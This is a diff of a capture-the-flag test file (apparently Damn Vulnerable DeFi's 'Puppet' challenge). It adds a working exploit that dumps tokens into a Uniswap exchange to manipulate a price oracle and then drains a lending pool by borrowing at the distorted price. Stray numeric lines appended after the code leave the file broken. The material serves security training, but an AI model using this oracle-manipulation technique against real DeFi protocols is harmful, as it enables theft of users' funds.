@@ -103,6 +103,39 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const state = async() => {
+            console.log('Deposit Required ' + ethers.utils.formatEther((await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE))))
+            console.log('ETH Exchange ' + ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)));
+            console.log('DVT Exchange ' + ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)));
+            console.log('ETH Pool ' + ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address)));
+            console.log('DVT Pool ' + ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address)));
+            console.log('ETH Attacker ' + ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log('DVT Attacker ' + ethers.utils.formatEther(await this.token.balanceOf(attacker.address))+ '\n');
+        }
+
+        console.log('============ BEFORE SWAP ============\n');
+        await state();
+
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        const deadline = ((await ethers.provider.getBlock('latest')).timestamp * 2);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther('999'),
+            1,
+            deadline,
+        )
+
+        console.log('============ AFTER SWAP / BEFORE BORROW ============\n');
+        await state();
+        
+        const depoitRequiredAmount = Math.ceil(ethers.utils.formatEther((await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE))))
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther(`${depoitRequiredAmount}`)})
+        
+        console.log('============ AFTER BORROW ============\n');
+        await state();
     });
 
     after(async function () {
@@ -117,3 +150,9 @@ describe('[Challenge] Puppet', function () {
         ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
     });
 });
+99304865938430984
+1010000000000000000000
+100000000000000000000000
+
+19664329888798200000
+34900571787058162662
